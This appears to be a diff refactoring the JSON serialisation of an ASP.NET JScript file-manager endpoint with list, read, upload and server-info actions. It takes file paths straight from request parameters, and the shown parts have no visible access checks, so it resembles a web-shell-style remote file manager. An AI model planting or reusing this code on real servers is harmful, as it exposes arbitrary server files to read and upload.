@@ -1,6 +1,5 @@
 <%@ Page Language="JScript" Debug="true" %>
 <%@ Import Namespace="System.IO" %>
-<%@ Import Namespace="System.Collections" %>
 <%
 Response.ContentType = "application/json";
 Response.Charset = "utf-8";
@@ -28,61 +27,57 @@ function escStr(s) {
     return String(s).replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "\\r").replace(/\t/g, "\\t");
 }
 
+function JsonObject() { this._keys = []; this._vals = []; }
+JsonObject.prototype.set = function(k, v) { this._keys.push(k); this._vals.push(v); };
+JsonObject.prototype.toJson = function() {
+    var parts = "";
+    for (var i = 0; i < this._keys.length; i++) {
+        if (i > 0) parts += ",";
+        parts += '"' + escStr(this._keys[i]) + '":' + toJson(this._vals[i]);
+    }
+    return "{" + parts + "}";
+};
+
+function JsonArray() { this._items = []; }
+JsonArray.prototype.add = function(v) { this._items.push(v); };
+JsonArray.prototype.toJson = function() {
+    var parts = "";
+    for (var i = 0; i < this._items.length; i++) {
+        if (i > 0) parts += ",";
+        parts += toJson(this._items[i]);
+    }
+    return "[" + parts + "]";
+};
+
 function toJson(obj) {
     if (obj == null) return "null";
-    var t = obj.GetType().Name;
-    if (t == "Boolean") return obj ? "true" : "false";
-    if (t == "Int32" || t == "Int64" || t == "Double" || t == "Single" || t == "Decimal") return obj.ToString();
-    if (t == "String") return '"' + escStr(obj) + '"';
-    if (t == "Hashtable") {
-        var ht = obj;
-        var parts = new ArrayList();
-        var en = ht.Keys.GetEnumerator();
-        while (en.MoveNext()) {
-            var k = en.Current;
-            parts.Add('"' + escStr(k) + '":' + toJson(ht[k]));
-        }
-        return "{" + join(parts, ",") + "}";
-    }
-    if (t == "ArrayList") {
-        var arr = obj;
-        var items = new ArrayList();
-        for (var i = 0; i < arr.Count; i++) {
-            items.Add(toJson(arr[i]));
-        }
-        return "[" + join(items, ",") + "]";
-    }
-    return '"' + escStr(obj.ToString()) + '"';
-}
-
-function join(arr, sep) {
-    var result = "";
-    for (var i = 0; i < arr.Count; i++) {
-        if (i > 0) result += sep;
-        result += arr[i];
-    }
-    return result;
+    if (typeof obj == "boolean") return obj ? "true" : "false";
+    if (typeof obj == "number") return obj.toString();
+    if (typeof obj == "string") return '"' + escStr(obj) + '"';
+    if (obj instanceof JsonObject) return obj.toJson();
+    if (obj instanceof JsonArray) return obj.toJson();
+    return '"' + escStr(String(obj)) + '"';
 }
 
 function ok(data) {
-    var r = new Hashtable();
-    r["success"] = true;
-    r["data"] = data;
-    r["message"] = "";
+    var r = new JsonObject();
+    r.set("success", true);
+    r.set("data", data);
+    r.set("message", "");
     return r;
 }
 
 function okMsg(msg) {
-    var r = new Hashtable();
-    r["success"] = true;
-    r["message"] = msg;
+    var r = new JsonObject();
+    r.set("success", true);
+    r.set("message", msg);
     return r;
 }
 
 function fail(msg) {
-    var r = new Hashtable();
-    r["success"] = false;
-    r["message"] = msg;
+    var r = new JsonObject();
+    r.set("success", false);
+    r.set("message", msg);
     return r;
 }
 
@@ -94,7 +89,6 @@ function formatSize(size) {
 }
 
 function toUnixTime(dt) {
-    // dt is .NET DateTime, not JS Date
     var epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
     var ticks = dt.ToUniversalTime().Ticks - epoch.Ticks;
     return Math.floor(ticks / 10000000);
@@ -113,16 +107,16 @@ function getPerms(attr, isDir) {
 }
 
 function makeItem(name, path, isDir, size, mtime, perms, writable) {
-    var item = new Hashtable();
-    item["name"] = name;
-    item["path"] = path;
-    item["is_dir"] = isDir;
-    item["size"] = isDir ? 0 : size;
-    item["size_formatted"] = isDir ? "-" : formatSize(size);
-    item["mtime"] = mtime;
-    item["perms"] = perms;
-    item["readable"] = true;
-    item["writable"] = writable;
+    var item = new JsonObject();
+    item.set("name", name);
+    item.set("path", path);
+    item.set("is_dir", isDir);
+    item.set("size", isDir ? 0 : size);
+    item.set("size_formatted", isDir ? "-" : formatSize(size));
+    item.set("mtime", mtime);
+    item.set("perms", perms);
+    item.set("readable", true);
+    item.set("writable", writable);
     return item;
 }
 
@@ -131,27 +125,29 @@ try {
         var listPath = normPath(getParam("path"));
         var dir = new DirectoryInfo(listPath);
         if (dir.Exists) {
-            var items = new ArrayList();
+            var items = new JsonArray();
             if (dir.Parent != null) {
-                items.Add(makeItem("..", dir.Parent.FullName, true, 0, 0, "drwxr-xr-x", true));
+                items.add(makeItem("..", dir.Parent.FullName, true, 0, 0, "drwxr-xr-x", true));
             }
             var dirs = dir.GetDirectories();
             for (var i = 0; i < dirs.Length; i++) {
                 try {
                     var d = dirs[i];
-                    items.Add(makeItem(d.Name, d.FullName, true, 0, toUnixTime(d.LastWriteTime), getPerms(int(d.Attributes), true), (int(d.Attributes) & 1) == 0));
+                    var attr = parseInt(d.Attributes);
+                    items.add(makeItem(d.Name, d.FullName, true, 0, toUnixTime(d.LastWriteTime), getPerms(attr, true), (attr & 1) == 0));
                 } catch (ex) {}
             }
             var files = dir.GetFiles();
             for (var j = 0; j < files.Length; j++) {
                 try {
                     var f = files[j];
-                    items.Add(makeItem(f.Name, f.FullName, false, int(f.Length), toUnixTime(f.LastWriteTime), getPerms(int(f.Attributes), false), !f.IsReadOnly));
+                    var fattr = parseInt(f.Attributes);
+                    items.add(makeItem(f.Name, f.FullName, false, parseInt(f.Length), toUnixTime(f.LastWriteTime), getPerms(fattr, false), !f.IsReadOnly));
                 } catch (ex) {}
             }
-            var data = new Hashtable();
-            data["path"] = listPath;
-            data["items"] = items;
+            var data = new JsonObject();
+            data.set("path", listPath);
+            data.set("items", items);
             Response.Write(toJson(ok(data)));
         } else {
             Response.Write(toJson(fail("Directory not found")));
@@ -161,9 +157,9 @@ try {
         var readPath = normPath(getParam("path"));
         if (File.Exists(readPath)) {
             var content = File.ReadAllText(readPath, System.Text.Encoding.UTF8);
-            var data = new Hashtable();
-            data["path"] = readPath;
-            data["content"] = content;
+            var data = new JsonObject();
+            data.set("path", readPath);
+            data.set("content", content);
             Response.Write(toJson(ok(data)));
         } else {
             Response.Write(toJson(fail("File not found")));
@@ -242,8 +238,8 @@ try {
             var uploadFile = Request.Files[0];
             var uploadFilePath = Path.Combine(uploadDir, Path.GetFileName(uploadFile.FileName));
             uploadFile.SaveAs(uploadFilePath);
-            var data = new Hashtable();
-            data["path"] = uploadFilePath;
+            var data = new JsonObject();
+            data.set("path", uploadFilePath);
             Response.Write(toJson(ok(data)));
         } else {
             Response.Write(toJson(fail("No file")));
@@ -297,53 +293,53 @@ try {
             diskFree = formatSize(drive.AvailableFreeSpace);
             diskTotal = formatSize(drive.TotalSize);
         } catch (ex) {}
-        var data = new Hashtable();
-        data["php_version"] = "JScript .NET " + System.Environment.Version.ToString();
-        data["server_software"] = Request.ServerVariables["SERVER_SOFTWARE"] || "IIS";
-        data["document_root"] = docRoot;
-        data["upload_max"] = "N/A";
-        data["disk_free"] = diskFree;
-        data["disk_total"] = diskTotal;
-        data["current_user"] = System.Environment.UserName || "N/A";
+        var data = new JsonObject();
+        data.set("php_version", "JScript .NET " + System.Environment.Version.ToString());
+        data.set("server_software", Request.ServerVariables["SERVER_SOFTWARE"] || "IIS");
+        data.set("document_root", docRoot);
+        data.set("upload_max", "N/A");
+        data.set("disk_free", diskFree);
+        data.set("disk_total", diskTotal);
+        data.set("current_user", System.Environment.UserName || "N/A");
         Response.Write(toJson(ok(data)));
     }
     else if (action == "info") {
         var infoPath = normPath(getParam("path"));
         if (File.Exists(infoPath)) {
             var fi = new FileInfo(infoPath);
-            var data = new Hashtable();
-            data["path"] = infoPath;
-            data["name"] = fi.Name;
-            data["is_dir"] = false;
-            data["size"] = int(fi.Length);
-            data["size_formatted"] = formatSize(fi.Length);
-            data["mtime"] = toUnixTime(fi.LastWriteTime);
-            data["ctime"] = toUnixTime(fi.CreationTime);
-            data["atime"] = toUnixTime(fi.LastAccessTime);
-            data["perms"] = getPerms(int(fi.Attributes), false);
-            data["perms_octal"] = "0644";
-            data["owner"] = "N/A";
-            data["group"] = "N/A";
-            data["readable"] = true;
-            data["writable"] = !fi.IsReadOnly;
+            var data = new JsonObject();
+            data.set("path", infoPath);
+            data.set("name", fi.Name);
+            data.set("is_dir", false);
+            data.set("size", parseInt(fi.Length));
+            data.set("size_formatted", formatSize(fi.Length));
+            data.set("mtime", toUnixTime(fi.LastWriteTime));
+            data.set("ctime", toUnixTime(fi.CreationTime));
+            data.set("atime", toUnixTime(fi.LastAccessTime));
+            data.set("perms", getPerms(parseInt(fi.Attributes), false));
+            data.set("perms_octal", "0644");
+            data.set("owner", "N/A");
+            data.set("group", "N/A");
+            data.set("readable", true);
+            data.set("writable", !fi.IsReadOnly);
             Response.Write(toJson(ok(data)));
         } else if (Directory.Exists(infoPath)) {
             var di = new DirectoryInfo(infoPath);
-            var data = new Hashtable();
-            data["path"] = infoPath;
-            data["name"] = di.Name;
-            data["is_dir"] = true;
-            data["size"] = 0;
-            data["size_formatted"] = "-";
-            data["mtime"] = toUnixTime(di.LastWriteTime);
-            data["ctime"] = toUnixTime(di.CreationTime);
-            data["atime"] = toUnixTime(di.LastAccessTime);
-            data["perms"] = getPerms(int(di.Attributes), true);
-            data["perms_octal"] = "0755";
-            data["owner"] = "N/A";
-            data["group"] = "N/A";
-            data["readable"] = true;
-            data["writable"] = (int(di.Attributes) & 1) == 0;
+            var data = new JsonObject();
+            data.set("path", infoPath);
+            data.set("name", di.Name);
+            data.set("is_dir", true);
+            data.set("size", 0);
+            data.set("size_formatted", "-");
+            data.set("mtime", toUnixTime(di.LastWriteTime));
+            data.set("ctime", toUnixTime(di.CreationTime));
+            data.set("atime", toUnixTime(di.LastAccessTime));
+            data.set("perms", getPerms(parseInt(di.Attributes), true));
+            data.set("perms_octal", "0755");
+            data.set("owner", "N/A");
+            data.set("group", "N/A");
+            data.set("readable", true);
+            data.set("writable", (parseInt(di.Attributes) & 1) == 0);
             Response.Write(toJson(ok(data)));
         } else {
             Response.Write(toJson(fail("Not found")));
